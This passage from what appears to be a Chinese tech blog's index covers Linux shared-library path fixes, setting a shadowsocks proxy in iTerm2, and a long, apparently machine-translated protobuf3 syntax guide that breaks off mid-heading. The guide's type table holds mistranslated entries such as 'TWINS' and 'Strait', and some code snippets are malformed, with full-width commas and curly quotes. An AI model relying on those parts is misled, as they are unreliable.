//纳尼？？！！！\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00124000)\n........\n```\n\n还记得上面提到了软链接么，`libmp3lame.so.0`就是`libmp3lame.so.0.0.0`的软链接，这是动态库的命名规范的一种公约，我们只要在/opt/目录下建立一个名为`libmp3lame.so.0`的到`/opt/libmp3lame.so.0.0.0`的软链接就OK了：\n\n```bash\n[root@localhost opt]# ln -s libmp3lame.so.0.0.0 libmp3lame.so.0\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /opt/libmp3lame.so.0 (0x00767000)   //终于圆满了:)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x006e8000)\n........\n```\n\n### 3. 总结\n\n针对动态库路径查找的种种问题，无非就这么两大类，关键是找对原因，对症下药，方能药到病除。\n\n+ PKG_CONFIG_PATH从字面意思上翻译，就是“软件包的配置路径”，这不很明显了么，编译软件时如果出现找不到所依赖的动态库时都全靠PKG_CONFIG_PATH了；\n+ LD_LIBRARY_PATH也很直白了“装载器的库路径”，LD是Loader的简写，在Linux系统启动一个程序的过程就叫做装载，一个程序要执行时它或多或少的会依赖一些动态库(静态编译的除外)。\n\n### 4. 参考资料\n\n+ http://blog.chinaunix.net/uid-23069658-id-4028681.html\n+ https://prefetch.net/articles/linkers.badldlibrary.html","tags":["linux"],"categories":["系统"]},{"title":"为iterm2设置shadowsocks代理","url":"%2Fp%2F937317d6.html","content":"\nshadowsocks是我们常用的代理工具，它使用socks5协议，而终端很多工具目前只支持http和https等协议，对socks5协议支持不够好，所以我们为终端设置shadowsocks的思路就是将socks协议转换成http协议，然后为终端设置即可。\n\n\n\n\n\n### 1. 设置终端代理\n\n最新的 [ShadowsocksX-NG](https://github.com/shadowsocks/ShadowsocksX-NG/releases/) 已经支持终端代理, 我们可以如下图复制得出:\n```bash\nexport http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;\n```\n<!-- more -->\n\n![1](为iterm2设置shadowsocks代理/1.png)\n\n\n\n为了方便, 我们可以制作一下别名\n\n```bash\nalias setproxy='export http_proxy=http://127.0.0.1:1087;export https_proxy=http://127.0.0.1:1087;' # 设置终端代理\n\nalias disproxy='unset http_proxy https_proxy' # 取消终端代理\n\nalias ip='curl cip.cc' # 测试\n```\n\n另外我们可以通过`ShadowsocksX-NG` 的偏好设置看到以下相关配置.\n\n\n\n##### 1.1 http监听端口\n\n![1](为iterm2设置shadowsocks代理/2.png)\n\n\n\n##### 1.2 sockes5监听端口\n\n![1](为iterm2设置shadowsocks代理/3.png)\n\n\n\n### 参考资料:\n\n+ https://droidyue.com/blog/2016/04/04/set-shadowsocks-proxy-for-terminal/\n+ https://blog.naaln.com/2019/03/terminal-proxy/\n\n","tags":["linux"],"categories":["iterm2"]},{"title":"protobuf3语法指南","url":"%2Fp%2F21122343.html","content":"\n\nProtocol Buffer是Google的语言中立的，平台中立的，可扩展机制的，用于序列化结构化数据 - 对比XML，但更小，更快，更简单。您可以定义数据的结构化，然后可以使用特殊生成的源代码轻松地在各种数据流中使用各种语言编写和读取结构化数据。\n\n### 1. 定义消息类型\n\n先来看一个非常简单的例子。假设你想定义一个“搜索请求”的消息格式，每一个请求含有一个查询字符串、你感兴趣的查询结果所在的页数，以及每一页多少条查询结果。可以采用如下的方式来定义消息类型的.proto文件了：\n\n```protobuf\nsyntax = \"proto3\";\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n```\n\n- 该文件的第一行指定您正在使用`proto3`语法：如果您不这样做，protobuf 编译器将假定您正在使用[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)。这必须是文件的第一个非空的非注释行。\n- 所述`SearchRequest`消息定义指定了三个字段（名称/值对），一个用于要在此类型的消息中包含的每个数据片段。每个字段都有一个名称和类型。\n\n<!-- more -->\n\n##### 1.1 指定字段类型\n\n在上面的示例中，所有字段都是[标量类型](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)：两个整数（`page_number`和`result_per_page`）和一个字符串（`query`）。但是，您还可以为字段指定合成类型，包括[枚举](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)和其他消息类型。\n\n\n\n##### 1.2 分配标识号\n\n正如上述文件格式，在消息定义中，每个字段都有唯一的一个**数字标识符**。这些标识符是用来在消息的[二进制格式](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)中识别各个字段的，一旦开始使用就不能够再改变。注：[1,15]之内的标识号在编码的时候会占用一个字节。[16,2047]之内的标识号则占用2个字节。所以应该为那些频繁出现的消息元素保留 [1,15]之内的标识号。切记：要为将来有可能添加的、频繁出现的标识号预留一些标识号。\n\n最小的标识号可以从1开始，最大到2^29 - 1, or 536,870,911。不可以使用其中的[19000－19999]的标识号， Protobuf协议实现中对这些进行了预留。如果非要在.proto文件中使用这些预留标识号，编译时就会报警。\n\n\n\n##### 1.3 指定字段规则\n\n消息字段可以是以下之一：\n\n- 单数：格式良好的消息可以包含该字段中的零个或一个（但不超过一个）。\n- `repeated`：此字段可以在格式良好的消息中重复任意次数（包括零）。将保留重复值的顺序。在proto3中，`repeated`数字类型的字段默认使用`packed`编码。`packed`您可以在[协议缓冲区编码中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding.html%23packed)找到有关编码的更多信息。\n\n+ 限定修饰符包含 required\\optional\\repeated\n\n  + Required: 表示是一个必须字段，必须相对于发送方，在发送消息之前必须设置该字段的值，对于接收方，必须能够识别该字段的意思。发送之前没有设置required字段或者无法识别required字段都会引发编解码异常，导致消息被丢弃。\n\n  + Optional：表示是一个可选字段，可选对于发送方，在发送消息时，可以有选择性的设置或者不设置该字段的值。对于接收方，如果能够识别可选字段就进行相应的处理，如果无法识别，则忽略该字段，消息中的其它字段正常处理。---因为optional字段的特性，很多接口在升级版本中都把后来添加的字段都统一的设置为optional字段，这样老的版本无需升级程序也可以正常的与新的软件进行通信，只不过新的字段无法识别而已，因为并不是每个节点都需要新的功能，因此可以做到按需升级和平滑过渡。\n\n  + Repeated：表示该字段可以包含0~N个元素。其特性和optional一样，但是每一次可以包含多个值。可以看作是在传递一个数组的值。\n\n\n\n##### 1.4 添加更多消息类型\n\n可以在单个`.proto`文件中定义多种消息类型。如果要定义多个相关消息，这很有用  \n\n例如，如果要定义与`SearchResponse`消息类型对应的回复消息格式，可以将其添加到相同的消息`.proto`：\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n}\n\nmessage SearchResponse {\n ...\n}\n```\n\n\n\n##### 1.5 添加注释\n\n要为`.proto`文件添加注释，请使用C / C ++ - 样式`//`和`/* ... */`语法。\n\n```protobuf\n/* SearchRequest表示搜索查询，带有分页选项\n *表明响应中包含哪些结果。*/\n\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2; //我们想要哪个页码？\n  int32 result_per_page = 3; //每页返回的结果数。\n}\n```\n\n\n\n##### 1.6 保留字段\n\n如果通过完全删除字段或将其注释来[更新](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)消息类型，则未来用户可以在对类型进行自己的更新时重用字段编号。\n\n如果以后加载相同的旧版本，这可能会导致严重问题`.proto`，包括数据损坏，隐私错误等。确保不会发生这种情况的一种方法是指定已删除字段的字段编号（和/或名称，这也可能导致JSON序列化问题）`reserved`。如果将来的任何用户尝试使用这些字段标识符，协议缓冲编译器将会抱怨。\n\n```protobuf\nmessage Foo {\n  reserved 2, 15, 9 to 11;\n  reserved \"foo\", \"bar\";\n}\n```\n\n请注意，您不能在同一`reserved`语句中混合字段名称和字段编号。\n\n\n\n##### 1.7 你的生成是什么`.proto`？\n\n当您在a上运行[协议缓冲区编译器](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23generating)时`.proto`，编译器会生成您所选语言的代码，您需要使用您在文件中描述的消息类型，包括获取和设置字段值，将消息序列化为输出流，并从输入流解析您的消息。\n\n- 对于**C ++**，编译器会从每个文件生成一个`.h`和一个`.cc`文件`.proto`，并为您文件中描述的每种消息类型提供一个类。\n- 对于**Java**，编译器生成一个`.java`文件，其中包含每种消息类型的类，以及`Builder`用于创建消息类实例的特殊类。\n- **Python**有点不同 - Python编译器生成一个模块，其中包含每个消息类型的静态描述符，`.proto`然后与*元类*一起使用，以在运行时创建必要的Python数据访问类。\n- 对于**Go**，编译器会为`.pb.go`文件中的每种消息类型生成一个类型的文件。\n- 对于**Ruby**，编译器生成一个`.rb`包含消息类型的Ruby模块的文件。\n- 对于**Objective-C**，编译器从每个文件生成一个`pbobjc.h`和一个`pbobjc.m`文件`.proto`，其中包含文件中描述的每种消息类型的类。\n- 对于**C＃**，编译器会`.cs`从每个文件生成一个文件`.proto`，其中包含文件中描述的每种消息类型的类。\n\n您可以按照所选语言的教程（即将推出的proto3版本）了解有关为每种语言使用API的更多信息。有关更多API详细信息，请参阅相关[API参考](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)（proto3版本即将推出）。\n\n\n\n### 2. 标量值类型\n\n标量消息字段可以具有以下类型之一 - 该表显示`.proto`文件中指定的类型，以及自动生成的类中的相应类型：\n\n| .proto type | notes                                                        | C ++ type | Java type   | Python type [2]  |  Go type         | Ruby type                    | C# type     | PHP type          |\n| ----------- | :----------------------------------------------------------- | --------- | ----------- | ---------------- | ------- | ---------------------------- | ----------- | ----------------- |\n| double      |                                                              | double    | double      | float            | float64 | float                        | double      | float             |\n| float       |                                                              | float     | float       | float            | FLOAT32 | float                        | float       | float             |\n| INT32       | 使用可变长度编码。编码负数的效率低 - 如果您的字段可能有负值，请改用sint32。 | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| Int64       | 使用可变长度编码。编码负数的效率低 - 如果您的字段可能有负值，请改用sint64。 | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| UINT32      | 使用可变长度编码。                                           | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| UINT64      | 使用可变长度编码。                                           | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| SINT32      | 使用可变长度编码。签名的int值。这些比常规int32更有效地编码负数。 | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sint64      | 使用可变长度编码。签名的int值。这些比常规int64更有效地编码负数。 | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| fixed32     | 总是四个字节。如果值通常大于2 28，则比uint32更有效。         | UINT32    | int [1]     | int / long [3]   | UINT32  | Fixnum or Bignum (as needed) | UINT        | Integer           |\n| fixed64     | 总是八个字节。如果值通常大于2 56，则比uint64更有效。         | UINT64    | Long [1]    | int / long [3]   | UINT64  | TWINS                        | ULONG       | Integer/string[5] |\n| sfixed32    | 总是四个字节。                                               | INT32     | INT         | INT              | INT32   | Fixnum or Bignum (as needed) | INT         | Integer           |\n| sfixed64    | 总是八个字节。                                               | Int64     | long        | int / long [3]   | Int64   | TWINS                        | long        | Integer/string[5] |\n| Boolean     |                                                              | Boolean   | Boolean     | Boolean          | Boolean | TrueClass / FalseClass       | Boolean     | Boolean           |\n| string      | 字符串必须始终包含UTF-8编码或7位ASCII文本。                  | string    | string      | str / unicode[4] | string  | String (UTF-8)               | string      | string            |\n| byte        | 可以包含任意字节序列。                                       | string    | Byte string | Strait           | []byte  | String (ASCII-8BIT)          | Byte string | string            |\n\n\n\n在[协议缓冲区编码中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)序列化消息时，您可以找到有关如何编码这些类型的更多信息。\n\n[1]在Java中，无符号的32位和64位整数使用它们的带符号对应表示，最高位只是存储在符号位中。\n\n[2]在所有情况下，将值设置为字段将执行类型检查以确保其有效。\n\n[3] 64位或无符号32位整数在解码时始终表示为long，但如果在设置字段时给出int，则可以为int。在所有情况下，该值必须适合设置时表示的类型。见[2]。\n\n[4] Python字符串在解码时表示为unicode，但如果给出了ASCII字符串，则可以是str（这可能会发生变化）。\n\n[5] Integer用于64位计算机，字符串用于32位计算机。\n\n\n\n### 3. 默认值\n\n解析消息时，如果编码消息不包含特定的单数元素，则解析对象中的相应字段将设置为该字段的默认值。这些默认值是特定于类型的：\n\n- 对于字符串，默认值为空字符串。\n- 对于字节，默认值为空字节。\n- 对于bools，默认值为false。\n- 对于数字类型，默认值为零。\n- 对于[枚举](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23enum)，默认值是第**一个定义的枚举值**，该**值**必须为0。\n- 对于消息字段，未设置该字段。它的确切值取决于语言。有关详细信息， 请参阅[生成的代码指](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)\n\n重复字段的默认值为空（通常是相应语言的空列表）。\n\n请注意，对于标量消息字段，一旦解析了消息，就无法确定字段是否显式设置为默认值（例如，是否设置了布尔值`false`）或者根本没有设置：您应该记住这一点在定义消息类型时。例如，`false`如果您不希望默认情况下也发生这种行为，那么在设置为时，没有一个布尔值可以启用某些行为。还要注意的是，如果一个标消息字段**被**设置为默认值，该值将不会在电线上连载。\n\n有关默认值如何在生成的代码中工作的更多详细信息，请参阅所选语言的[生成代码指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)。\n\n### 4. 枚举\n\n在定义消息类型时，您可能希望其中一个字段只有一个预定义的值列表。例如，假设你想添加一个 `corpus`字段每个`SearchRequest`，其中语料库可以 `UNIVERSAL`，`WEB`，`IMAGES`，`LOCAL`，`NEWS`，`PRODUCTS`或`VIDEO`。您可以非常简单地通过`enum`为每个可能的值添加一个常量来定义消息定义。\n\n在下面的示例中，我们添加了一个带有所有可能值的`enum`调用`Corpus`，以及一个类型的字段`Corpus`：\n\n```protobuf\nmessage SearchRequest {\n  string query = 1;\n  int32 page_number = 2;\n  int32 result_per_page = 3;\n  enum Corpus {\n    UNIVERSAL = 0;\n    WEB = 1;\n    IMAGES = 2;\n    LOCAL = 3;\n    NEWS = 4;\n    PRODUCTS = 5;\n    VIDEO = 6;\n  }\n  Corpus corpus = 4;\n}\n```\n\n如您所见，`Corpus`枚举的第一个常量映射为零：每个枚举定义**必须**包含一个映射到零的常量作为其第一个元素。这是因为：\n\n- 必须有一个零值，以便我们可以使用0作为数字[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)。\n- 零值必须是第一个元素，以便与[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)语义兼容，其中第一个枚举值始终是默认值。\n\n\n\n您可以通过为不同的枚举常量指定相同的值来定义别名。为此，您需要将`allow_alias`选项设置为`true`，否则协议编译器将在找到别名时生成错误消息。\n\n```protobuf\nenum EnumAllowingAlias {\n  option allow_alias = true;\n  UNKNOWN = 0;\n  STARTED = 1;\n  RUNNING = 1;\n}\nenum EnumNotAllowingAlias {\n  UNKNOWN = 0;\n  STARTED = 1;\n  // RUNNING = 1;  // Uncommenting this line will cause a compile error inside Google and a warning message outside.\n}\n```\n\n枚举器常量必须在32位整数范围内。由于`enum`值在线上使用[varint编码](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fencoding)，因此负值效率低，因此不建议使用。您可以`enum`在消息定义中定义s，如上例所示，`enum`也可以在外部定义 - 这些可以在`.proto`文件的任何消息定义中重用。您还可以使用`enum`语法将一个消息中声明的类型用作另一个消息中的字段类型。 `*MessageType*.*EnumType*`\n\n当你在`.proto`使用a的协议缓冲编译器上运行时`enum`，生成的代码将具有`enum`Java或C ++ 的相应代码，这`EnumDescriptor`是Python的一个特殊类，用于在运行时生成的类中创建一组带有整数值的符号常量。\n\n在反序列化期间，将在消息中保留无法识别的枚举值，但是当反序列化消息时，如何表示这种值取决于语言。在支持具有超出指定符号范围的值的开放枚举类型的语言中，例如C ++和Go，未知的枚举值仅作为其基础整数表示存储。在具有封闭枚举类型（如Java）的语言中，枚举中的大小写用于表示无法识别的值，并且可以使用特殊访问器访问基础整数。在任何一种情况下，如果消息被序列化，则仍然会使用消息序列化无法识别的值。\n\n有关如何`enum`在应用程序中使用消息的详细信息，请参阅所选语言的[生成代码指南](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)。\n\n\n\n##### 4.1 保留值\n\n如果通过完全删除枚举条目或将其注释掉来[更新](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23updating)枚举类型，则未来用户可以在对类型进行自己的更新时重用该数值。如果以后加载相同的旧版本，这可能会导致严重问题`.proto`，包括数据损坏，隐私错误等。确保不会发生这种情况的一种方法是指定已删除条目的数值（和/或名称，这也可能导致JSON序列化问题）`reserved`。如果将来的任何用户尝试使用这些标识符，协议缓冲编译器将会抱怨。您可以使用`max`关键字指定保留的数值范围达到最大可能值。\n\n```protobuf\nenum Foo {\n  reserved 2, 15, 9 to 11, 40 to max;\n  reserved \"FOO\", \"BAR\";\n}\n```\n\n请注意，您不能在同一`reserved`语句中混合字段名称和数值。\n\n\n\n### 5. 使用其他消息类型\n\n您可以使用其他消息类型作为字段类型。例如，假设你想包括`Result`每个消息的`SearchResponse`消息-要做到这一点，你可以定义一个`Result`在同一个消息类型`.proto`，然后指定类型的字段`Result`中`SearchResponse`：\n\n```protobuf\nmessage SearchResponse {\n  repeated Result results = 1;\n}\n\nmessage Result {\n  string url = 1;\n  string title = 2;\n  repeated string snippets = 3;\n}\n```\n\n\n\n##### 5.1 导入定义\n\n在上面的示例中，`Result`消息类型在同一文件中定义`SearchResponse`- 如果要用作字段类型的消息类型已在另一个`.proto`文件中定义，该怎么办？\n\n您可以`.proto`通过*导入*来使用其他文件中的定义。要导入其他`.proto`人的定义，请在文件顶部添加import语句：\n\n```protobuf\nimport \"myproject/other_protos.proto\";\n```\n\n默认情况下，您只能使用直接导入`.proto`文件中的定义。但是，有时您可能需要将`.proto`文件移动到新位置。`.proto`现在，您可以`.proto`在旧位置放置一个虚拟文件，以使用该`import public`概念将所有导入转发到新位置，而不是直接移动文件并在一次更改中更新所有调用站点。`import public`任何导入包含该`import public`语句的proto的人都可以传递依赖关系。例如：\n\n```protobuf\n// new.proto\n// All definitions are moved here\n\n// old.proto\n//This is the proto that all clients are importing.\nimport public“new.proto”;\nimport“other.proto”;\n\n// client.proto\nimport \"old.proto\";\n//您使用old.proto和new.proto中的定义，但不使用other.proto\n```\n\n协议编译器使用`-I`/ `--proto_path`flag 在协议编译器命令行中指定的一组目录中搜索导入的文件 。如果没有给出标志，它将查找调用编译器的目录。通常，您应该将`--proto_path`标志设置为项目的根目录，并对所有导入使用完全限定名称。\n\n##### 5.2 使用proto2消息类型\n\n可以导入[proto2](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)消息类型并在proto3消息中使用它们，反之亦然。但是，proto2枚举不能直接用于proto3语法（如果导入的proto2消息使用它们就可以了）。\n\n\n\n### 6. 嵌套类型\n\n您可以在其他消息类型中定义和使用消息类型，如下例所示 - 此处`Result`消息在消息中定义`SearchResponse`：\n\n```protobuf\nmessage SearchResponse {\n  message Result {\n    string url = 1;\n    string title = 2;\n    repeated string snippets = 3;\n  }\n  repeated Result results = 1;\n}\n```\n\n如果要在其父消息类型之外重用此消息类型，请将其称为： `*Parent*.*Type*`\n\n```protobuf\nmessage SomeOtherMessage {\n  SearchResponse.Result result = 1;\n}\n```\n\n您可以根据需要深入嵌套消息：\n\n```protobuf\nmessage Outer {       // Level 0\n  message MiddleAA {  // Level 1\n    message Inner {   // Level 2\n      int64 ival = 1;\n      bool  booly = 2;\n    }\n  }\n  message MiddleBB {  // Level 1\n    message Inner {   // Level 2\n      int32 ival = 1;\n      bool  booly = 2;\n    }\n  }\n}\n```\n\n\n\n### 7. 更新消息类型\n\n如果现有的消息类型不再满足您的所有需求 - 例如，您希望消息格式具有额外的字段 - 但您仍然希望使用使用旧格式创建的代码，请不要担心！在不破坏任何现有代码的情况下更新消息类型非常简单。请记住以下规则：\n\n- 请勿更改任何现有字段的字段编号。\n- 如果添加新字段，则使用“旧”消息格式按代码序列化的任何消息仍可由新生成的代码进行解析。您应该记住这些元素的[默认值](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23default)，以便新代码可以正确地与旧代码生成的消息进行交互。同样，您的新代码创建的消息可以由旧代码解析：旧的二进制文件在解析时只是忽略新字段。有关详细信息，请参阅“ [未知字段”](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23unknowns)部分\n- 只要在更新的消息类型中不再使用字段编号，就可以删除字段。您可能希望重命名该字段，可能添加前缀“OBSOLETE_”，或者[保留](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23reserved)字段编号，以便您的未来用户`.proto`不会意外地重复使用该编号。\n- `int32`，`uint32`，`int64`，`uint64`，和`bool`都是兼容的-这意味着你可以改变这些类型到另一个的一个场不破坏forwards-或向后兼容。如果从导线中解析出一个不符合相应类型的数字，您将获得与在C ++中将该数字转换为该类型相同的效果（例如，如果将64位数字作为int32读取，它将被截断为32位）。\n- `sint32`并且`sint64`彼此兼容但与其他整数类型*不*兼容。\n- `string``bytes`只要字节是有效的UTF-8 ，它们是兼容的。\n- `bytes`如果字节包含消息的编码版本，则嵌入消息是兼容的。\n- `fixed32`与兼容`sfixed32`，并`fixed64`用`sfixed64`。\n- `enum`与兼容`int32`，`uint32`，`int64`，和`uint64`电线格式条款（注意，如果他们不适合的值将被截断）。但请注意，在反序列化消息时，客户端代码可能会以不同方式对待它们：例如，`enum`将在消息中保留未识别的proto3 类型，但在反序列化消息时如何表示这种类型取决于语言。Int字段总是保留它们的价值。\n- 将单个值更改为**新** 成员`oneof`是安全且二进制兼容的。`oneof`如果您确定没有代码一次设置多个字段，则将多个字段移动到新字段可能是安全的。将任何字段移动到现有字段`oneof`并不安全。\n\n\n\n### 8. 未知字段\n\n未知字段是格式良好的协议缓冲区序列化数据，表示解析器无法识别的字段。例如，当旧二进制文件解析具有新字段的新二进制文件发送的数据时，这些新字段将成为旧二进制文件中的未知字段。\n\n最初，proto3消息在解析期间总是丢弃未知字段，但在3.5版本中，我们重新引入了保存未知字段以匹配proto2行为。在版本3.5及更高版本中，未知字段在解析期间保留并包含在序列化输出中。\n\n\n\n### 9. 任何\n\n该`Any`消息类型，可以使用邮件作为嵌入式类型，而不必自己.proto定义。一个`Any`含有任意的序列化消息`bytes`，以充当一个全局唯一标识符和解析到该消息的类型的URL一起。要使用该`Any`类型，您需要[导入](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23other)`google/protobuf/any.proto`。\n\n```protobuf\nimport \"google/protobuf/any.proto\";\n\nmessage ErrorStatus {\n  string message = 1;\n  repeated google.protobuf.Any details = 2;\n}\n```\n\n给定消息类型的默认类型URL是。 `type.googleapis.com/*packagename*.*messagename*`\n\n不同的语言实现将支持运行时库佣工类型安全的方式打包和解包的任何值-例如，在Java中，任何类型都会有特殊`pack()`和`unpack()`存取，而在C ++中有`PackFrom()`和`UnpackTo()`方法：\n\n```protobuf\n// Storing an arbitrary message type in Any.\nNetworkErrorDetails details = ...;\nErrorStatus status;\nstatus.add_details()->PackFrom(details);\n\n// Reading an arbitrary message from Any.\nErrorStatus status = ...;\nfor (const Any& detail : status.details()) {\n  if (detail.Is<NetworkErrorDetails>()) {\n    NetworkErrorDetails network_error;\n    detail.UnpackTo(&network_error);\n    ... processing network_error ...\n  }\n}\n```\n\n**目前，正在开发用于处理Any类型的运行时库**。\n\n如果您已熟悉[proto2语法](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto)，则Any类型将替换[扩展](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto%23extensions)。\n\n\n\n### 10. Oneof\n\n如果您有一个包含许多字段的消息，并且最多只能同时设置一个字段，则可以使用oneof功能强制执行此行为并节省内存。\n\n除了一个共享内存中的所有字段之外，其中一个字段类似于常规字段，并且最多可以同时设置一个字段。设置oneof的任何成员会自动清除所有其他成员。您可以使用特殊`case()`或`WhichOneof()`方法检查oneof中的哪个值（如果有），具体取决于您选择的语言。\n\n##### 10.1 使用Oneof\n\n要在您中定义oneof，请`.proto`使用`oneof`关键字后跟您的oneof名称，在这种情况下`test_oneof`：\n\n```protobuf\nmessage SampleMessage {\n  oneof test_oneof {\n    string name = 4;\n    SubMessage sub_message = 9;\n  }\n}\n```\n\n然后，将oneof字段添加到oneof定义中。您可以添加任何类型的字段，但不能使用`repeated`字段。\n\n在生成的代码中，oneof字段与常规字段具有相同的getter和setter。您还可以使用特殊方法检查oneof中的值（如果有）。您可以在相关[API参考中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)找到有关所选语言的oneof API的更多信息。\n\n##### 10.2 Oneof 特性\n\n- 设置oneof字段将自动清除oneof的所有其他成员。因此，如果您设置了多个字段，则只有您设置的最后一个字段仍然具有值。\n\n  ```protobuf\nSampleMessage message;\n  message.set_name(\"name\");\nCHECK(message.has_name());\n  message.mutable_sub_message();   // Will clear name field.\n  CHECK(!message.has_name());\n  ```\n  \n- 如果解析器在线路上遇到同一个oneof的多个成员，则在解析的消息中仅使用看到的最后一个成员。\n\n- oneof不支持`repeated`。\n\n- Reflection API适用于其中一个字段。\n\n- 如果您使用的是C ++，请确保您的代码不会导致内存崩溃。以下示例代码将崩溃，`sub_message`已通过调用该`set_name()`方法删除了该代码。\n\n  ```protobuf\nSampleMessage message;\n  SubMessage* sub_message = message.mutable_sub_message();\n  message.set_name(\"name\");      // Will delete sub_message\n  sub_message->set_...            // Crashes here \n  ```\n  \n- 同样在C ++中，如果你有`Swap()`两个消息与oneofs，每个消息最终将与另一个消息结果：在下面的例子中，`msg1`将有一个`sub_message`，`msg2`并将有一`name`。\n\n  ```protobuf\n  SampleMessage msg1;\n  msg1.set_name(\"name\");\n  SampleMessage msg2;\n  msg2.mutable_sub_message();\n  msg1.swap(&msg2);\n  CHECK(msg1.has_sub_message());\n  CHECK(msg2.has_name());\n  ```\n\n##### 10.3 向后兼容性问题\n\n添加或删除其中一个字段时要小心。如果检查oneof返回的值`None`/ `NOT_SET`，这可能意味着oneof尚未设置或已在不同版本的oneof的被设置为一个字段。没有办法区分，因为没有办法知道线上的未知字段是否是其中一个成员。\n\n##### 10.4 标签重用问题\n\n- **将字段移入或移出oneof**：在序列化和解析消息后，您可能会丢失一些信息（某些字段将被清除）。但是，您可以安全地将单个字段移动到**新的** oneof中，并且如果已知只有一个字段被设置，则可以移动多个字段。\n- **删除oneof字段并将其添加回**：在序列化和解析消息后，这可能会清除当前设置的oneof字段。\n- **拆分或合并oneof**：这与移动常规字段有类似的问题。\n\n### 11. 地图\n\n如果要在数据定义中创建关联映射，协议缓冲区提供了一种方便的快捷方式语法：\n\n```protobuf\nmap < key_type ，value_type > map_field = N ;\n```\n\n...其中`key_type`可以是任何整数或字符串类型（因此，除了浮点类型之外的任何[标量](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Fproto3%23scalar)类型`bytes`）。请注意，枚举不是有效的`key_type`。的`value_type`可以是任何类型的除另一地图。\n\n因此，例如，如果要创建项目映射，其中每条`Project`消息都与字符串键相关联，则可以像下面这样定义它：\n\n```protobuf\nmap < string ，Project > projects = 3 ;  \n```\n\n- 地图字段不能`repeated`。\n- 地图值的有线格式排序和地图迭代排序未定义，因此您不能依赖于特定顺序的地图项目。\n- 为a生成文本格式时`.proto`，地图按键排序。数字键按数字排序。\n- 从线路解析或合并时，如果有重复的映射键，则使用最后看到的键。从文本格式解析映射时，如果存在重复键，则解析可能会失败。\n- 如果为映射字段提供键但没有值，则字段序列化时的行为取决于语言。在C ++，Java和Python中，类型的默认值是序列化的，而在其他语言中没有任何序列化。\n\n生成的地图API目前可用于所有proto3支持的语言。您可以在相关[API参考中](https://link.juejin.im?target=https%3A%2F%2Fdevelopers.google.com%2Fprotocol-buffers%2Fdocs%2Freference%2Foverview)找到有关所选语言的地图API的更多信息。\n\n##### 11.1 向后兼容性\n\n映射语法在线上等效于以下内容，因此不支持映射的协议缓冲区实现仍可处理您的数据：\n\n```\nmessage MapFieldEntry {\n  key_type key = 1;\n  value_type value = 2;\n}\n\nrepeated MapFieldEntry map_field = N;\n```\n\n任何支持映射的协议缓冲区实现都必须生成和接受上述定义可以接受的数据。\n\n\n\n### 12. 